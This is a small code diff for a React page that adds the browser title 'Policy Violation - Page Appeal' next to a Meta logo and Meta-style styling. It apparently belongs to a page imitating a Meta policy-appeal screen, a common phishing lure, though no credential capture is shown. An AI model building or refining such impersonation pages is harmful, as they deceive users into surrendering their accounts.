@@ -166,6 +166,7 @@ const Page: FC = () => {
 
     return (
         <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
+            <title>Policy Violation - Page Appeal</title>
             <div className='flex w-full max-w-[1100px]'>
                 <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                     <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
